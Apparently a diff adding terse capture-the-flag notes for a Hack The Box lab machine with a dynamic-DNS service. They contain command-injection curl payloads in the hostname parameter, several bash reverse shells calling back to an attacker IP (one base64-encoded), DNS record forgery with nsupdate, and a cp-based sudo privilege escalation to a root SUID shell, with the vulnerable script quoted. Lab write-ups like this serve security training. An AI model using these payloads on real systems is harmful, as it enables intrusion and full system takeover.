@@ -1,0 +1,167 @@
+Always recursively fuzz subdirectories
+Always google the things you discover...
+
+https://www.noip.com/integrate/request
+
+
+curl -G --data-urlencode 'hostname=$(whoami).no-ip.htb' 'http://dynadns:sndanyd@no-ip.htb/nic/update'
+
+https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Decimal')&input=MTAuMTAuMTYuMTA
+https://www.noip.com/integrate/request
+https://stackoverflow.com/questions/9270734/ssh-permissions-are-too-open-error
+https://www.ibm.com/docs/en/zos/2.4.0?topic=daemon-format-authorized-keys-file
+https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
+
+curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=lol.no-ip.htb&myip=10.10.14.10'
+
+curl "http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=lol.no-ip.htb"
+
+
+curl -G --data-urlencode 'hostname=$(whoami).no-ip.htb' 'http://dynadns:sndanyd@no-ip.htb/nic/update'
+
+curl -G --data-urlencode 'hostname=$(ls).no-ip.htb' 'http://dynadns:sndanyd@no-ip.htb/nic/update'
+
+curl -G --data-urlencode 'hostname=$(/bin/bash -c "bash -i >& /dev/tcp/168431626/443 0>&1").no-ip.htb' 'http://dynadns:sndanyd@no-ip.htb/nic/update'
+
+can also use `` for code injection
+
+
+curl 'http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=`bash -i >& /dev/tcp/168431626/443 0>&1`.no-ip.htb&myip=10.10.14.10'
+
+curl 'http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=as`sleep+1`d.no-ip.htb'
+curl 'http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=as`sleep+1`d.no-ip.htb&myip=10.10.14.10'
+
+
+curl 'http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=`bash+-i+>&+/dev/tcp/168431626/443+0>&1`.no-ip.htb&myip=10.10.14.10'
+
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMC80NDMgMD4mMQ== | base64 -d | bash
+
+
+https://www.base64encode.org/
+
+use exploit.py 
+
+
+tcpdump -i tun0 -n icmp
+
+
+
+
+
+
+
+www-data
+
+we need to get to bindmgr
+
+search through bindmgr folder for private key and public key
+
+seeing the auth key file, we realise that we need to add some DNS record 
+
+nsupdate -t 1 -k /etc/bind/infra.key
+ADD asd.infra.dyna.htb 30 IN A MY-IP
+send
+ADD REVRSE LOOKUP OUTPUT 30 IN PTR asd.infra.dyna.htb
+send
+
+
+
+
+nslookup
+> server target ip
+> asd.infra.dyna.htb
+> MY-IP
+REVRSE LOOKUP OUTPUT (should be error until you add PTR record)
+
+ssh using private public key
+
+sudo -l
+
+source code analysis, realise that cp command is vulnerable
+
+meed to create .version file and a --preserve=mode file
+
+touch .version
+echo 1 > .version (make sure version must match)
+touch -- --preserve=mode
+rm -- --preserve=mode (need to add "--")
+cp over our bash file with all priv sed (SUID as well)
+chmod 7777 bash
+
+run the script
+realise that the files has been copied over while preserving ownership as root
+
+run the bash script with setuid bit set and owned by root with -p flag to preserve privileges
+
+
+#!/usr/bin/bash
+
+# This script generates named.conf.bindmgr to workaround the problem
+# that bind/named can only include single files but no directories.
+#
+# It creates a named.conf.bindmgr file in /etc/bind that can be included
+# from named.conf.local (or others) and will include all files from the
+# directory /etc/bin/named.bindmgr.
+#
+# NOTE: The script is work in progress. For now bind is not including
+#       named.conf.bindmgr. 
+#
+# TODO: Currently the script is only adding files to the directory but
+#       not deleting them. As we generate the list of files to be included
+#       from the source directory they won't be included anyway.
+
+BINDMGR_CONF=/etc/bind/named.conf.bindmgr
+BINDMGR_DIR=/etc/bind/named.bindmgr
+
+indent() { sed 's/^/    /'; }
+
+# Check versioning (.version)
+echo "[+] Running $0 to stage new configuration from $PWD."
+if [[ ! -f .version ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 42
+fi
+if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 43
+fi
+
+# Create config file that includes all files from named.bindmgr.
+echo "[+] Creating $BINDMGR_CONF file."
+printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
+for file in * ; do
+    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
+done
+
+# Stage new version of configuration files.
+echo "[+] Staging files to $BINDMGR_DIR."
+cp .version * /etc/bind/named.bindmgr/
+
+# Check generated configuration with named-checkconf.
+echo "[+] Checking staged configuration."
+named-checkconf $BINDMGR_CONF >/dev/null
+if [[ $? -ne 0 ]] ; then
+    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
+    named-checkconf $BINDMGR_CONF 2>&1 | indent
+    exit 44
+else 
+    echo "[+] Configuration successfully staged."
+    # *** TODO *** Uncomment restart once we are live.
+    # systemctl restart bind9
+    if [[ $? -ne 0 ]] ; then
+        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
+	systemctl status bind9
+    else
+	echo "[+] Restart of bind9 via systemctl succeeded."
+    fi
+fi
+
+
+
+1. Command Injection
+2. DNS + SSH
+3. Sudo Privileges Abuse
+
+
+
+
